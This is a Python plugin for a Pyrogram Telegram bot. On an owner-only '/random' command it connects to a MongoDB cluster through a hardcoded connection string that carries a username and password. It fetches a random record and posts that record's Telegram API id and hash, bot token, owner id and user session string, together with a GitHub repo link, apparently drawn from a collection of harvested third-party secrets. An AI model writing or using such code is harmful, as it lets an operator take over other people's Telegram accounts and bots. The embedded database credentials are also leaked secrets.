from pyrogram import Client, filters
from Hancock import *
import pymongo
import random

@Hancock.on_message(
    filters.command("random")
    & filters.private
    & filters.user(OWNER_ID)
)
async def fetch_random_mongodb_data(client, message):
    try:
        # Replace 'abcd' with your actual username and password
        url = "mongodb+srv://a1:a1@cluster0.0pola4b.mongodb.net/?retryWrites=true&w=majority"

        # Connect to the MongoDB cluster
        client = pymongo.MongoClient(url)

        # Specify the 'wholedata' database
        db = client['wholedata']

        # Assuming you have a collection named 'data' in the 'wholedata' database
        collection = db['data']

        # Add a match stage to filter documents where bot_username is not None
        match_stage = { '$match': { 'bot_username': { '$ne': None } } }

        # Include the match stage in the aggregation pipeline
        aggregation_pipeline = [match_stage, { '$sample': { 'size': 1 } }]

        # Fetch a random document from the collection with the updated pipeline
        random_document = collection.aggregate(aggregation_pipeline).next()

        # Format the data for display
        formatted_text = (
            f"Source: `https://github.com/{random_document['repo_link']}`\n"
            f"API id: `{random_document['telegram_api']}`\n"
            f"API hash: `{random_document['telegram_hash']}`\n"
            f"OWNER id: `{random_document['owner_id']}`\n"
            f"Bot Token: `{random_document['bot_token']}`\n"
            f"Bot Username: `@{random_document['bot_username']}`\n"
            f"String: `{random_document['user_session_string']}`"
        )

        # Send the formatted text as a reply
        await message.reply_text(text=formatted_text)

    except Exception as e:
        print(f"Error fetching random MongoDB data: {e}")
  
